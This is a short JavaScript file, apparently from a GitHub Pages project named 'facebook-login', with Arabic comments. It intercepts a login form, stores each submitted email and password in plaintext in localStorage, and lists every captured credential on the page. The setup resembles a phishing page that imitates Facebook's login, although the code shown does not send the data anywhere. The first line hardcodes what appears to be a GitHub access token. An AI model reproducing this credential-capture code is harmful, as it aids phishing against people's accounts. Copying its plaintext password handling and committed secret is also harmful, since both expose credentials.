const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    // حفظ في localStorage (يشتغل على GitHub Pages 100%)
    let users = JSON.parse(localStorage.getItem('users') || '[]');
    users.push({id: Date.now(), email, password, date: new Date().toISOString()});
    localStorage.setItem('users', JSON.stringify(users));
    
    message.innerHTML = `✅ تم الحفظ! (${users.length} مستخدم)<br><h3>👥 المستخدمين:</h3>`;
    users.forEach(u => {
        message.innerHTML += `<p>📧 ${u.email} | 🔐 ${u.password}</p>`;
    });
    message.className = 'success';
    document.getElementById('loginForm').reset();
});
